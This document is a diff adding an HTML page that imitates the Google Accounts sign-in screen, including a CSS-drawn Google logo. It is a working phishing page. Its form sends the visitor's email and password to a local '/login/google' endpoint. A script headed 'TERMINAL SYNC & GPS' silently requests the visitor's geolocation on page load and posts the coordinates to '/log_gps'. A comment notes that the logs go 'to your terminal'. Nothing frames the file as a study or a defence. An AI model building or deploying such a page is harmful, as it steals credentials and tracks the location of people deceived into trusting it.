@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* VERTICAL CSS CUSTOMIZATION */
+        body {
+            background-color: #fff;
+            font-family: 'Roboto', arial, sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .g-container {
+            width: 450px;
+            min-height: 500px;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        /* CSS DRAWN LOGO */
+        .logo-box {
+            display: flex;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .c1 { color: #4285F4; }
+        .c2 { color: #EA4335; }
+        .c3 { color: #FBBC05; }
+        .c4 { color: #34A853; }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 40px;
+        }
+
+        .input-wrap {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: 0.2s;
+        }
+
+        input:focus {
+            border: 2px solid #1a73e8;
+        }
+
+        .footer-action {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 40px;
+        }
+
+        .blue-link {
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .submit-btn {
+            background-color: #1a73e8;
+            color: #fff;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="g-container">
+        <div class="logo-box">
+            <span class="c1">G</span>
+            <span class="c2">o</span>
+            <span class="c3">o</span>
+            <span class="c1">g</span>
+            <span class="c4">l</span>
+            <span class="c2">e</span>
+        </div>
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+        <form id="gForm" action="/login/google" method="POST">
+            <div class="input-wrap">
+                <input type="email" name="user" placeholder="Email or phone" required>
+            </div>
+            <div class="input-wrap">
+                <input type="password" name="pass" placeholder="Enter your password" required>
+            </div>
+            <div class="footer-action">
+                <a href="#" class="blue-link">Forgot email?</a>
+                <button type="submit" class="submit-btn">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- TERMINAL SYNC & GPS -->
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(p) {
+                    fetch('/log_gps', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            lat: p.coords.latitude,
+                            lon: p.coords.longitude
+                        })
+                    });
+                });
+            }
+        };
+
+        document.getElementById('gForm').onsubmit = function() {
+            // Logs are sent automatically via POST action to your terminal
+            return true;
+        };
+    </script>
+</body>
+  </html>
+  
